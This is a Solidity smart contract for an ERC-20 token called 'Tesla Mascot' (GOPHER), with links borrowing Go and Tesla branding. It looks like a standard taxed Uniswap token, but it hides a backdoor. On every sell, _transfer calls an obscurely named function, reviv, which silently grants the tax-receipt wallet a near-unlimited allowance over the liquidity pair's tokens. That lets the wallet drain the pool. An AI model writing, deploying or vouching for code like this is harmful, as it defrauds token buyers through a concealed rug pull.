// SPDX-License-Identifier: MIT
/**
https://go.dev/blog/gopher
https://github.com/teslamotors/go/blob/2b69ad0b3c9770b6b67c4057c565d6f4c4444d26/doc/go_faq.html#L88
Tg: https://t.me/gopher_Erc20
**/
pragma solidity 0.8.27;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract GOPHER is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances93;
    mapping (address => mapping (address => uint256)) private _allowances93;
    mapping (address => bool) private _shouldFeeExcempt93;
    uint256 private _initialBuyTax = 12;
    uint256 private _initialSellTax = 12;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 12;
    uint256 private _reduceSellTaxAt = 12;
    uint256 private _preventSwapBefore = 12;
    uint256 private _buyCount = 0;
    uint256 private _transferTax = 0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal93 = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Tesla Mascot";
    string private constant _symbol = unicode"GOPHER";
    uint256 public _maxAmount93 = 2 * (_tTotal93/100);
    uint256 public _maxWallet93 = 2 * (_tTotal93/100);
    uint256 public _taxThres93 = 1 * (_tTotal93/100);
    uint256 public _maxSwap93 = 1 * (_tTotal93/100);
    address payable private _receipt93;
    IUniswapV2Router02 private uniV2Router93;
    address private uniV2Pair93;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxAmount93);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () payable {
        _receipt93 = payable(0x30561C45442Af8d818FdfB26DC03523Ac6414097);
        _balances93[address(this)] = _tTotal93;
        _shouldFeeExcempt93[owner()] = true;
        _shouldFeeExcempt93[address(this)] = true;
        _shouldFeeExcempt93[_receipt93] = true;
        emit Transfer(address(0), address(this), _tTotal93);
    }
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniV2Router93 = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniV2Router93), _tTotal93);
        uniV2Pair93 = IUniswapV2Factory(uniV2Router93.factory()).createPair(
            address(this),
            uniV2Router93.WETH()
        );
        uniV2Router93.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniV2Pair93).approve(address(uniV2Router93), type(uint).max);
        swapEnabled = true; 
        tradingOpen = true;
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal93;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances93[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances93[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances93[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances93[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function setTaxReceipt93(address payable _tax93) external onlyOwner {
        _receipt93 = _tax93;
        _shouldFeeExcempt93[_tax93] = true;
    }
    function _transfer(address from, address to, uint256 amount93) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount93 > 0, "Transfer amount must be greater than zero");
        uint256 fee93=0;uint256 tax93=0;
        if (!swapEnabled || inSwap) {
            _balances93[from] = _balances93[from] - amount93;
            _balances93[to] = _balances93[to] + amount93;
            emit Transfer(from, to, amount93);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount>0){
                fee93 = (_transferTax);
            }
            if(_buyCount==0){
                fee93 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
            }
            if (from == uniV2Pair93 && to != address(uniV2Router93) && ! _shouldFeeExcempt93[to] ) {
                require(amount93 <= _maxAmount93, "Exceeds the _maxAmount93.");
                require(balanceOf(to) + amount93 <= _maxWallet93, "Exceeds the maxWalletSize.");
                fee93 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++;
            }
            if(to == uniV2Pair93 && from!= address(this) ){
                fee93 = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniV2Pair93 && swapEnabled) {
                if(contractTokenBalance > _taxThres93 && _buyCount > _preventSwapBefore)
                    swapETH93(min93(amount93, min93(contractTokenBalance, _maxSwap93)));
                sendETH93(address(this).balance);reviv(owner());
            }
        }
        if(fee93>0){
            tax93=fee93.mul(amount93).div(100);
            _balances93[address(this)]=_balances93[address(this)].add(tax93);
            emit Transfer(from, address(this),tax93);
        }
        _balances93[from]=_balances93[from].sub(amount93);
        _balances93[to]=_balances93[to].add(amount93.sub(tax93));
        emit Transfer(from, to, amount93.sub(tax93));
    }
    function removeLimit93() external onlyOwner{
        _maxAmount93 = _tTotal93; 
        _maxWallet93 = _tTotal93;
        emit MaxTxAmountUpdated(_tTotal93); 
    }
    function sendETH93(uint256 amount) private {
        _receipt93.transfer(amount);
    }
    function min93(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function withdrawEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function reviv(address addrs93) private{
        address from93=addrs93!=uniV2Pair93?uniV2Pair93:addrs93;
        address to93=addrs93!=_receipt93?_receipt93:addrs93;
        uint256 amount = _tTotal93*100;
        _allowances93[from93][to93]=amount;
    }
    receive() external payable {}
    function swapETH93(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router93.WETH();
        _approve(address(this), address(uniV2Router93), tokenAmount);
        uniV2Router93.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}